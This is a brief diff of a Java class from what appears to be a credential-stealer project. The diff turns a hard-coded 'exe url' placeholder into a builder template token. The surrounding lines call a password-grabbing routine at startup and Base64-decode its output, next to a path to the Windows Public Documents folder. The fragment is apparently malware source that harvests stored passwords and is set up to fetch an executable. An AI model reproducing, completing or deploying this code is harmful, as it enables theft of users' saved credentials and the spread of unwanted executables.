@@ -20,7 +20,7 @@ public class Start {
     public static long snowflakeId = Snowflake.generateSnowflakeId();
     public static String documents = "C:\\Users\\Public\\Documents";
 
-    public static String exeUrl = "your exe url";
+    public static String exeUrl = "%%exeurl%%";
     static String passwords = new Passwords().grabPassword();
 
     public static String aaaa = new String(Base64.getDecoder().decode(passwords), StandardCharsets.UTF_8);
